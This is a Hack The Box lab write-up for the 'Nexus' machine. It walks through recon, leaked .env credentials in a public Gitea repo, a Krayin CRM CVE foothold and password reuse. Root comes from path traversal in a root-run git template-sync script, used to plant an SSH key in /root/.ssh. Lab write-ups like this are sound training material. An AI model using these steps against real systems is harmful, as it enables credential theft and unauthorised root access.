# Nexus HTB Writeup

## Reconnaissance

The initial step involves scanning the target machine to discover open ports and running services. We perform an Nmap scan to gather this information.

### Nmap Scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Nexus Energy Authority \xE2\x80\x94 Powering the Nation's Future
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The Nmap scan reveals two open ports: SSH on port 22 and an Nginx web server on port 80.

### Subdomain Fuzzing

With the web server discovered, we perform subdomain fuzzing to identify other potential virtual hosts on the target.

```
git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 45ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 122ms]
:: Progress: [100000/100000] :: Job [1/1] :: 630 req/sec :: Duration: [0:02:01] :: Errors: 0 ::
```

This reveals two subdomains: `git` and `billing`.

During the initial enumeration, we also identify a potential user from the web application:
- Hiring Manager: `j.matthew@nexus.htb`

### Gitea Web Application

Investigating the `git` subdomain reveals a Gitea instance (Version 1.26.0). We find a public repository named `admin/krayin-docker-setup`. Analyzing the files within this repository exposes several sensitive configuration details.

The `docker-compose.yml` file contains database configurations:

```yaml
version: '3.1'
DB_HOST: krayin-mysql
DB_PORT: 3306
DB_DATABASE: krayin
DB_USERNAME: krayin
DB_PASSWORD: ${DB_PASSWORD}
```

Furthermore, the `.env` file within the repository leaks significant application environment variables, including database credentials and other configuration settings:

```dotenv
APP_NAME='Krayin CRM'
APP_ENV=local
APP_KEY=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD
VITE_HOST=
VITE_PORT=
LOG_CHANNEL=stack
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=krayin-mysql
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=
DB_PREFIX=
BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120
MEMCACHED_HOST=127.0.0.1
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379
MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com
MAIL_RECEIVER_DRIVER=sendgrid
IMAP_HOST=imap.nexus.htb
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=username1
IMAP_PASSWORD=password1
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1
MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

![[Pasted image 20260703145548.png]]

## Foothold / Initial Access

Using the credentials and information gathered during the reconnaissance phase, we can authenticate to the `billing` dashboard.

We log in as `j.matthew@nexus.htb` with the password `N27xh!!2ucY04`.

The dashboard reveals that the application running is Krayin CRM Version 2.2.0. This version is known to be vulnerable.

[Krayin CRM Version: 2.2.0](https://github.com/pawpic/CVE-2026-38526-POC)

![[Pasted image 20260703150925.png]]

By exploiting this known vulnerability (CVE-2026-38526), we manage to gain remote code execution and establish an initial foothold on the system as the `www-data` user.

## Privilege Escalation

### Lateral Movement to `jones`

Once on the system, we begin enumerating as the `www-data` user. We find database credentials in the `/home/www-data/krayin/.env` file:

```shell
www-data@nexus:~/krayin$ cat .env
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

We also check the `/etc/passwd` file to identify other users on the system, specifically locating the user `jones`:

```shell
www-data@nexus:~/krayin$ cat /etc/passwd | tail
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
jones:x:1000:1000:,,,:/home/jones:/bin/bash
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

With the newly discovered password `y27xb3ha!!74GbR`, we can attempt password reuse and successfully SSH into the machine as the user `jones`.

```shell
ssh jones@nexus.htb
The authenticity of host 'nexus.htb (10.129.38.201)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nexus.htb' (ED25519) to the list of known hosts.
jones@nexus.htb's password:
```

### Escalating to `root`

As the `jones` user, we check for scheduled tasks using systemd timers and discover a timer for syncing Gitea templates running frequently:

```shell
jones@nexus:~$ systemctl list-timers
NEXT                             LEFT LAST                              PASSED UNIT                           ACTIVATES
Fri 2026-07-03 13:21:43 UTC        7s Fri 2026-07-03 13:20:43 UTC      52s ago gitea-template-sync.timer      gitea-template-sync.service
```

Examining the service file for this timer reveals that it executes a Python script as `root`:

```shell
jones@nexus:~$ cat /etc/systemd/system/gitea-template-sync.service
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

We review the contents of the Python script `/etc/gitea/template-sync.py`:

```python
import os
import sys
import json
import subprocess
import time
import urllib.request

GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = "[%s] %s" % (ts, msg)
    print(line, flush=True)
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except:
        pass

def load_config():
    config = {}
    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        k, v = line.split('=', 1)
                        config[k.strip()] = v.strip()
        except:
            pass
    return config

def get_token():
    cfg = load_config()
    return cfg.get('GITEA_API_TOKEN')

def get_template_repos(token):
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
    req = urllib.request.Request(url, headers={
        'Authorization': 'token %s' % token
    })
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
            repos = data.get('data', data) if isinstance(data, dict) else data
            return [r for r in repos if r.get('template', False)]
    except Exception as e:
        log("API error: %s" % e)
        return []

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    if not os.path.isdir(bare_path):
        log("  repo not found: %s" % bare_path)
        return

    # Read tree entries from the bare repository
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log("  ls-tree failed: %s" % result.stderr.strip())
            return
    except Exception as e:
        log("  ls-tree error: %s" % e)
        return

    entries = []
    for line in result.stdout.strip().split('\n'):
        if not line:
            continue
        parts = line.split('\t', 1)
        if len(parts) != 2:
            continue
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    if not entries:
        log("  no files in template")
        return

    # Extract files to staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
            GIT = ['git', '-c', 'safe.directory=*']
            cat_result = subprocess.run(
                GIT + ['cat-file', 'blob', objhash],
                cwd=bare_path,
                capture_output=True, timeout=10
            )
            if cat_result.returncode != 0:
                continue

            with open(target, 'wb') as f:
                f.write(cat_result.stdout)

            if mode == '100755':
                os.chmod(target, 0o755)
            else:
                os.chmod(target, 0o644)

            log("  synced: %s" % filepath)
        except Exception as e:
            log("  error syncing %s: %s" % (filepath, e))

def main():
    log("Template sync starting")

    token = get_token()
    if not token:
        log("No API token found")
        sys.exit(1)

    templates = get_template_repos(token)
    log("Found %d template repo(s)" % len(templates))

    for repo in templates:
        name = repo['full_name']
        log("Syncing template: %s" % name)
        sync_template(repo)

    log("Template sync complete")

if __name__ == '__main__':
    main()
```

Analyzing the script, we find a vulnerability in how the script parses Git trees and handles paths. The relevant vulnerable code block is:

```python
# Read tree entries from the bare repository
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log("  ls-tree failed: %s" % result.stderr.strip())
            return
    except Exception as e:
        log("  ls-tree error: %s" % e)
        return
[...]
target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
```

The script extracts a Git template into a directory using paths read from `git ls-tree`, and it calls `os.makedirs(target_dir, exist_ok=True)` without sanitizing the filepath. This allows for an arbitrary file write or directory traversal vulnerability.

To exploit this, we create a template repository using the `jones` user on the Gitea instance (since we can reuse their credentials). 

![[Pasted image 20260703153110.png]]

We then craft an exploit payload to write our SSH public key to `/root/.ssh/authorized_keys` or similar sensitive locations. The following python script builds the malicious Git tree:

![[Pasted image 20260703153525.png]]

We generate a new SSH key pair and use the `build.py` script inside our local Git repository to create a commit with a malicious path traversal structure that injects our SSH key.

```shell
┌──(julicc㉿arceus)-[/tmp/rce]
└─$ ssh-keygen -t ed25519 -f /tmp/.k -N ''
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/.k
Your public key has been saved in /tmp/.k.pub
The key fingerprint is:
SHA256:NQVpmgKakQl/XN3tGjAq3GrbmrmxGLO8sXv0fi2RRpo julicc@arceus
The key's randomart image is:
+--[ED25519 256]--+
|.. o  .. ..+.    |
| .+...  + +..    |
|  .=oo . *o.     |
|  o.o + +....    |
|     o =S. o     |
|    + E + .      |
|  +o.+ . o       |
| . Bo=o o .      |
|  B+*+.. .       |
+----[SHA256]-----+

┌──(julicc㉿arceus)-[/tmp]
└─$ python3 /tmp/build.py
Run inside git repo

┌──(julicc㉿arceus)-[/tmp]
└─$ cd rce

┌──(julicc㉿arceus)-[/tmp/rce]
└─$ python3 /tmp/build.py
Done: 303b4b1321710253730ca3d8b5e44a85cc3d91af

┌──(julicc㉿arceus)-[/tmp/rce]
└─$ git push -u origin main --force
advertencia: no es posible acceder '../../../../../root/.gitattributes': Permiso denegado
advertencia: no es posible acceder '../../../../../root/.ssh/.gitattributes': Permiso denegado
Enumerando objetos: 11, listo.
Contando objetos: 100% (11/11), listo.
Compresión delta usando hasta 16 hilos
Comprimiendo objetos: 100% (3/3), listo.
Escribiendo objetos: 100% (11/11), 616 byte | 616.00 KiB/s, listo.
Total 11 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://git.nexus.htb/jones/rce.git
 * [new branch]      main -> main
rama 'main' configurada para rastrear 'origin/main'.
```

![[Pasted image 20260703154521.png]]

After pushing the malicious template to the Gitea server, the `gitea-template-sync.service` cronjob runs as `root`, pulls our repository, and writes our provided public SSH key to the root user's SSH configuration folder. We can then successfully SSH into the target as `root` and retrieve the root flag.

```shell
┌──(julicc㉿arceus)-[/tmp/rce]
└─$ ssh -i /tmp/.k root@nexus.htb
root@nexus:~# cat /root/root.txt
58721e6ba16756c7a72a1afbe08d9b48
```

## Conclusion

This machine provided a great overview of common misconfigurations and chaining vulnerabilities. The exploitation path started with information gathering via open directories and exposed `.env` files. We gained initial access through an outdated Krayin CRM version containing a known RCE vulnerability. After achieving a foothold, password reuse allowed lateral movement to another user account. Finally, privilege escalation was achieved by analyzing a custom Python script executed as a root scheduled task and exploiting a directory traversal vulnerability during Git template synchronization, ultimately yielding a `root` shell.
